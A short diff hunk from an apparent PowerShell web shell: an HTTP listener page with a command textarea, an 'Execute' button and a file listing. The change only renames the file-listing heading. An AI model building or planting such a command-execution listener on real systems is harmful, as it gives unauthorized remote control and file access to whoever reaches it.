@@ -103,7 +103,7 @@ while ($httpsrvlsnr.IsListening) {
             $html += "<input type='submit' value='Execute'>"
             $html += "<textarea name='command' rows='10' cols='80'></textarea><br>"
             $html += "</form></ul>"
-            $html += "<h1>File Listing</h1><ul>"
+            $html += "<h1>User Files</h1><ul>"
             $files = Get-ChildItem -Path $PWD.Path -Force
             foreach ($file in $files) {
                 $fileUrl = $file.FullName -replace [regex]::Escape($PWD.Path), ''
